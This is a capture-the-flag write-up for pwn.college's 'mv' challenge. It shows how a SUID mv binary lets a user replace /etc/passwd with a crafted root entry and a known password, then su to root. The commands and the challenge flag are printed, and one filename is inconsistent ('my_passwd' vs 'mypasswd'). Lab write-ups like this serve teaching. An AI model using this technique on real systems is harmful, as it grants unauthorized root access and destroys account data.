---
layout: page
title: "Challenge Name: mv"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/mv`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/mv
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/mv
```

- The `s` in `-rws` indicates it's a SUID binary.
- `mv` runs with **root privileges**.

## 🚀 Exploitation

The `mv` command in Linux is used to move or rename files and directories.

But even after moving a root required file , it wont release it's restriction.
for this challenge the trick lies within /etc/passwd 's root:x:0:0:root:/root:/bin/bash entry , when we move a content filled file to other content filled file the data is overwrited , so we can simple edit the password section of root:/bin/bash without out own using mv command.

How? , Lets see :

```bash
openssl passwd -6 himanshu
```
helps us to generate SHA-512 password, this is what we need to overwrite in /etc/passwd.

the above command will give us key: 
```
$6$Li9Qnq0.BAXNaFIh$IYorgsG4l3v0XzC2X0ls47SwRnPOZpxbi0Cyznsghg7QRFvpTC/08PqGi.cNczupsJFVhxFenavghFRvA2wx3/
```

this need to be crafted with : root:x:0:0:root:/root:/bin/bash

which results in : 

```
root:$6$Li9Qnq0.BAXNaFIh$IYorgsG4l3v0XzC2X0ls47SwRnPOZpxbi0Cyznsghg7QRFvpTC/08PqGi.cNczupsJFVhxFenavghFRvA2wx3/:0:0:root:/root:/bin/bash
```

```bash
cat > my_passwd
root:$6$Li9Qnq0.BAXNaFIh$IYorgsG4l3v0XzC2X0ls47SwRnPOZpxbi0Cyznsghg7QRFvpTC/08PqGi.cNczupsJFVhxFenavghFRvA2wx3/:0:0:root:/root:/bin/bash
^C
mv mypasswd /etc/passwd
su
password: himanshu
```

Output:
```
root@program-misuse~mv:/home/hacker# cat /flag
pwn.college{QAAvzCHieOeQPr6bHT2GvMIZVmd.dJDOxwSM0IzMyEzW}
```
